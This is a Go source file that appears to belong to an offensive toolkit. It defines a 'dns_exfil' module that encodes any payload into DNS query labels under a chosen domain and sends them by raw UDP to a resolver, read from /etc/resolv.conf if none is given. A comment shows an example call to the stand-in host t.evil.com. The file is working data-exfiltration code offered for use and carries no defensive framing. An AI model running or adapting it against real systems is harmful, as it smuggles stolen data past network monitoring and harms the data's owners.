package agentfw

import (
	"context"
	"fmt"
	"net"
	"os"
	"strings"
	"time"

	"github.com/sk666G/red-sky---arsenal/internal/dnsexfil"
)

type dnsExfilModule struct{}

func init() { Register(dnsExfilModule{}) }

func (dnsExfilModule) Name() string { return "dns_exfil" }

// args: ["<domain>", "<resolver-or-empty>", "<payload>"]
// Example: dns_exfil t.evil.com 8.8.8.8 "secret data here"
func (dnsExfilModule) Run(ctx context.Context, args []string) Result {
	if len(args) < 3 {
		return Result{Err: fmt.Errorf("dns_exfil needs <domain> <resolver|-> <payload>"), ExitCode: 2}
	}
	domain := args[0]
	resolver := args[1]
	if resolver == "-" {
		resolver = ""
	}
	payload := strings.Join(args[2:], " ")

	sessionID := fmt.Sprintf("s%d", time.Now().UnixNano()&0xFFFFFF)
	labels := dnsexfil.Encode([]byte(payload), sessionID, domain)

	if resolver == "" {
		resolver = systemResolver()
	}
	if resolver == "" {
		return Result{Err: fmt.Errorf("no resolver"), ExitCode: 2}
	}

	var sent int
	for _, label := range labels {
		if err := sendDNSQuery(label, resolver); err == nil {
			sent++
		}
		time.Sleep(50 * time.Millisecond)
	}
	return Result{
		Output:   fmt.Sprintf("dns_exfil session=%s sent %d/%d labels to %s\n", sessionID, sent, len(labels), resolver),
		ExitCode: 0,
	}
}

func systemResolver() string {
	data, err := os.ReadFile("/etc/resolv.conf")
	if err != nil {
		return ""
	}
	for _, line := range strings.Split(string(data), "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "nameserver") {
			fields := strings.Fields(line)
			if len(fields) >= 2 {
				return fields[1]
			}
		}
	}
	return ""
}

func sendDNSQuery(qname, resolver string) error {
	txid := uint16(time.Now().UnixNano() & 0xFFFF)
	pkt := make([]byte, 12)
	pkt[0] = byte(txid >> 8)
	pkt[1] = byte(txid)
	pkt[2] = 0x01 // recursion desired
	pkt[5] = 0x01 // qdcount

	for _, part := range strings.Split(qname, ".") {
		if len(part) == 0 {
			continue
		}
		if len(part) > 63 {
			part = part[:63]
		}
		pkt = append(pkt, byte(len(part)))
		pkt = append(pkt, part...)
	}
	pkt = append(pkt, 0)
	pkt = append(pkt, 0, 1, 0, 1) // qtype A, qclass IN

	addr, err := net.ResolveUDPAddr("udp", resolver+":53")
	if err != nil {
		return err
	}
	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		return err
	}
	defer conn.Close()
	conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
	_, err = conn.Write(pkt)
	return err
}
